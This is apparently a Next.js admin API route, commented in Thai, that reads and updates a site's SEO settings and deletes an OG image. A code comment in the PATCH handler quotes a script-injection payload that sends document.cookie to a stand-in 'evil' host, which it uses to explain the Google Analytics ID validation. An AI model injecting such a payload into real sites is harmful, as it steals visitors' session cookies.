import { NextRequest } from "next/server"
import { revalidatePath } from "next/cache"

import { requireAdmin } from "@/lib/api/guards"
import { apiError, apiOk, handleApiError } from "@/lib/api/response"
import { siteConfig } from "@/config/site"
import { prisma } from "@/lib/db"
import { deleteFile } from "@/lib/storage"

/** ตารางนี้มีได้แถวเดียว — ถ้ายังไม่มีให้สร้างจากค่าใน siteConfig */
async function getOrCreateSettings() {
  const existing = await prisma.seoSettings.findFirst()
  if (existing) return existing

  return prisma.seoSettings.create({
    data: {
      siteTitle: siteConfig.title,
      siteDescription: siteConfig.description,
    },
  })
}

// GET /api/admin/seo-settings
export async function GET() {
  try {
    const guard = await requireAdmin()
    if (!guard.ok) return guard.response

    return apiOk({ settings: await getOrCreateSettings() })
  } catch (error) {
    return handleApiError(error, "admin/seo-settings:get")
  }
}

// PATCH /api/admin/seo-settings
export async function PATCH(request: NextRequest) {
  try {
    const guard = await requireAdmin()
    if (!guard.ok) return guard.response

    const { siteTitle, siteDescription, ogImage, googleAnalyticsId } = await request.json()

    if (!siteTitle?.trim()) return apiError("กรุณากรอกชื่อเว็บไซต์")

    // ค่านี้ถูกแทรกลงใน <Script> ของ layout ตรงๆ ถ้าไม่จำกัดรูปแบบ
    // สตริงอย่าง X'); fetch('//evil/'+document.cookie); // จะรันบนทุกหน้า
    const gaId = googleAnalyticsId?.trim() || null
    if (gaId && !/^(G|UA|GTM)-[A-Z0-9-]+$/i.test(gaId)) {
      return apiError("รหัส Google Analytics ไม่ถูกต้อง (เช่น G-XXXXXXXXXX)")
    }

    const current = await getOrCreateSettings()

    const settings = await prisma.seoSettings.update({
      where: { id: current.id },
      data: {
        siteTitle: siteTitle.trim(),
        siteDescription: siteDescription?.trim() || null,
        ogImage: ogImage || null,
        googleAnalyticsId: gaId,
      },
    })

    revalidatePath("/", "layout")

    return apiOk({ settings, message: "บันทึกการตั้งค่า SEO เรียบร้อยแล้ว" })
  } catch (error) {
    return handleApiError(error, "admin/seo-settings:update")
  }
}

// DELETE /api/admin/seo-settings?imageUrl=... — ลบรูป OG
export async function DELETE(request: NextRequest) {
  try {
    const guard = await requireAdmin()
    if (!guard.ok) return guard.response

    const imageUrl = new URL(request.url).searchParams.get("imageUrl")
    if (!imageUrl) return apiError("ไม่พบ URL รูปภาพ")

    const settings = await prisma.seoSettings.findFirst()
    if (settings) {
      await prisma.seoSettings.update({
        where: { id: settings.id },
        data: { ogImage: null },
      })
    }

    await deleteFile(imageUrl)

    revalidatePath("/", "layout")

    return apiOk({ message: "ลบรูปภาพเรียบร้อยแล้ว" })
  } catch (error) {
    return handleApiError(error, "admin/seo-settings:delete-image")
  }
}
